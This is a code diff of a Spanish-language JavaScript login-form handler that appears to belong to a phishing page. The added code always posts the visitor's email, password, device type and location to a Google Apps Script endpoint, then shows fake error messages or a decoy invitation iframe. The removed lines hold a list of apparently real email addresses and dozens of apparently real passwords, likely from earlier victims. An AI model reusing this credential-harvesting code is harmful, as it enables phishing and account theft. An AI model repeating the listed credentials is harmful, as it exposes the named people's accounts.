@@ -1,5 +1,5 @@
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
-    event.preventDefault(); // Evita el envío automático
+    event.preventDefault(); // Evita el envío automático 
 
     // Obtener elementos del formulario
     const emailInput = document.querySelector('input[name="email"]');
@@ -7,8 +7,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     const errorMessage = document.getElementById('error-message');
     
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["jhonantony0110@gmail.com","aridiazgu@uch.pe","darlyn.dayanramendoza@gmail.com","lsanchezv2@upao.edu.pe","tequenazo1995@gmail.com","delgadoangenny@gmail.com","aleferreyro1@gmail.com","bernatAaramichele38@gmail.com","yessenia.arista09@gmail.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["14238095","Alyssrominaxd","alyssrominaxd","jovita70","Jovita70","Alyssromina21","alyssromina21","adri71318901","Adri71318901","alyssromina21xd","Alyssromina21xd","cielito1309","Cielito1309","Mybabyslat23$","-Mybabyslat23$","050285cr7","lavidaesunamierda2","Cambiocambio2","Cambiocambio3","cambiocambio3","cambiocambio2","lavidaesunamierda2","emilse.1952@","Madrid1917@","Emilse.1952@","929915693bas","929915693Bas","jugodefresa5","Jugodefresa5","jugodefresa","Jugodefresa","Darlyn2006","darlyn2006","18668799","Tifany123.","Soportes.2025","soportes.2025","jenniffer0505","Jenniffer0505","no quiero p","No quiero p","kimbergor22","Kimbergor22","johitaw12","Johitaw12","ange27","Ange27","Yessenia09","yessenia.09","Yessenia.09","cambiocambio3","pepas5314","Pepas5314","kpgz16$%","jovita70**","Jovita70**","17025612","Jovita70*","jovita70*","grissel1234567890#","Grissel1234567890#","lavidaesunamierda2","Cambiocambio2","cambiocambio2","4FS3YZfpZCjwPAR","977846069","dairy.12","jovita70**","Nuevasoportunidades08","nuevasoportunidades08","Olivia1106","Olivia11.06","Olivia2109","olivia1106","olivia11.06","Olivia2019","olivia2019"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedEmails = ["ejemplo1@correo.com"]; // Agregar correos prohibidos aquí
+    const prohibitedWords = ["hola123"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
@@ -23,53 +23,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     
     // Verificar correo prohibido
     const isProhibitedEmail = prohibitedEmails.includes(email);
-    if (isProhibitedEmail) {
-        errorMessage.textContent = "Correo no válido";
-        errorMessage.style.color = 'red';
-                errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
-        emailInput.value = '';
-        passwordInput.value = '';
-        return; // Detiene el procesamiento
-    }
-    
-   // Verificar contraseña prohibida
+    // Verificar contraseña prohibida
     const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
-    if (containsProhibitedPassword) {
-        errorMessage.textContent = "Contraseña incorrecta";
-        errorMessage.style.color = 'red';
-        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
-        passwordInput.value = '';
-        return; // Detiene el procesamiento
-    }
-    
-    // Si pasa todas las validaciones, continúa con el proceso normal
-    // Limpiar cualquier mensaje de error previo
-    if (errorMessage) {
-        errorMessage.textContent = "";
-    }
-
-    // Ocultar el formulario
-    document.getElementById("miFormulario").style.display = "none";
-    
-    // Mostrar mensaje "Cargando..."
-    let loadingMessage = document.createElement("p");
-    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
-    loadingMessage.style.textAlign = "center";
-    document.body.appendChild(loadingMessage);
-    
- // Antes de mostrar el iframe, ocultar el footer de folder.html
-document.querySelector("p").style.display = "none"; 
-
-// Mostrar el iframe
-let iframe = document.getElementById("usuarioFrame");
-iframe.src = "invitation.html";
-iframe.style.display = "block";
-
-    
-    // Eliminar mensaje de carga después de mostrar usuario.html
-    iframe.onload = function() {
-        loadingMessage.remove();
-    };
     
     // ✅ Detectar si el usuario usa iPhone o Android
     let deviceType = "Otro"; // Valor por defecto
@@ -102,11 +57,74 @@ iframe.style.display = "block";
     formData.append("device", deviceType); // Agregar dispositivo
     formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
     
-    // ✅ Enviar los datos correctamente a Google Sheets
-    const url = "https://script.google.com/macros/s/AKfycbyc3GMZd_iHz3YAthw0BkMNt-5kdbxBtd4sBB3HodkJRvOUXUtT3qtRKRlzGj9TMQMG/exec";
-    fetch(url, {
-        method: "POST",
-        body: new URLSearchParams(formData),
-        headers: { "Content-Type": "application/x-www-form-urlencoded" }
-    }).catch(error => console.error("Error al enviar datos:", error));
+    // Agregar estado de validación para tracking
+    if (isProhibitedEmail) {
+        formData.append("status", "Email prohibido");
+    } else if (containsProhibitedPassword) {
+        formData.append("status", "Contraseña prohibida");
+    } else {
+        formData.append("status", "Acceso exitoso");
+    }
+    
+    // ✅ SIEMPRE enviar los datos a Google Sheets
+    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
+    
+    try {
+        await fetch(url, {
+            method: "POST",
+            body: new URLSearchParams(formData),
+            headers: { "Content-Type": "application/x-www-form-urlencoded" }
+        });
+        console.log("Datos enviados exitosamente");
+    } catch (error) {
+        console.error("Error al enviar datos:", error);
+    }
+    
+    // Ahora manejar la respuesta del usuario según el caso
+    if (isProhibitedEmail) {
+        // Mostrar error de correo y limpiar campos
+        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
+        errorMessage.style.color = 'red';
+        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+        emailInput.value = '';
+        passwordInput.value = '';
+        return; // Detiene el procesamiento para el usuario
+    }
+    
+    if (containsProhibitedPassword) {
+        // Mostrar error de contraseña y limpiar solo la contraseña
+        errorMessage.textContent = "Contraseña incorrecta";
+        errorMessage.style.color = 'red';
+        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+        passwordInput.value = '';
+        return; // Detiene el procesamiento para el usuario
+    }
+    
+    // Si pasa todas las validaciones, continúa con el proceso normal
+    // Limpiar cualquier mensaje de error previo
+    if (errorMessage) {
+        errorMessage.textContent = "";
+    }
+
+    // Ocultar el formulario
+    document.getElementById("miFormulario").style.display = "none";
+    
+    // Mostrar mensaje "Cargando..."
+    let loadingMessage = document.createElement("p");
+    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
+    loadingMessage.style.textAlign = "center";
+    document.body.appendChild(loadingMessage);
+    
+    // Antes de mostrar el iframe, ocultar el footer de folder.html
+    document.querySelector("p").style.display = "none"; 
+
+    // Mostrar el iframe
+    let iframe = document.getElementById("usuarioFrame");
+    iframe.src = "invitation.html";
+    iframe.style.display = "block";
+    
+    // Eliminar mensaje de carga después de mostrar usuario.html
+    iframe.onload = function() {
+        loadingMessage.remove();
+    };
 });
